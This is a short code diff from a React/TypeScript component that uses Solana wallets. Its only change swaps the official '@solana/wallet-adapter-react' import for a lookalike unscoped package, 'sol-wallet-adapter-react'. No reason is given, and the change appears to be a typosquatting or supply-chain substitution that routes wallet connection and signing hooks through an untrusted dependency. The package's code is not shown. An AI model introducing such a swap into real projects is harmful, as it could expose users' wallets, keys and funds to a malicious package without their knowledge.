@@ -1,5 +1,5 @@
 import { Button } from '@mui/material';
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
+import { useConnection, useWallet } from 'sol-wallet-adapter-react';
 import type { TransactionSignature } from '@solana/web3.js';
 import { PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
 import type { FC } from 'react';
